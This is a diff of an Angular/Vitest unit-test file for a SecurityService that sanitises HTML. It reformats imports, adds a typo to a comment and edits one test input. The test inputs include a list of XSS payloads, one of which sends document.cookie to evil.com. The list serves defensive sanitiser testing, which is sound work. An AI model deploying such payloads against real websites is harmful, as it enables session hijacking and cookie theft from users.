@@ -1,6 +1,6 @@
-import { TestBed } from '@angular/core/testing';
-import { SecurityService } from './security.service';
-import { describe, it, expect, beforeEach } from 'vitest';
+import {TestBed} from '@angular/core/testing';
+import {SecurityService} from './security.service';
+import {beforeEach, describe, expect, it} from 'vitest';
 
 /**
  * Tests unitaires pour SecurityService
@@ -77,7 +77,7 @@ describe('SecurityService', () => {
     });
   });
 
-  // ==================== Tests stripHtmlTags ====================
+  // ==================== Tests striptHtmlTags ====================
 
   describe('stripHtmlTags()', () => {
     it('devrait supprimer toutes les balises HTML', () => {
@@ -146,7 +146,7 @@ describe('SecurityService', () => {
   describe('Scénarios d\'injection XSS', () => {
     const xssPayloads = [
       '<script>document.location="http://evil.com/?c="+document.cookie</script>',
-      '<img src=x onerror=alert(1)>',
+      '<img src=x onerror=alert(1) alt="test-x">',
       '<svg onload=alert(1)>',
       'javascript:alert(document.domain)',
       '<iframe src="javascript:alert(1)">',
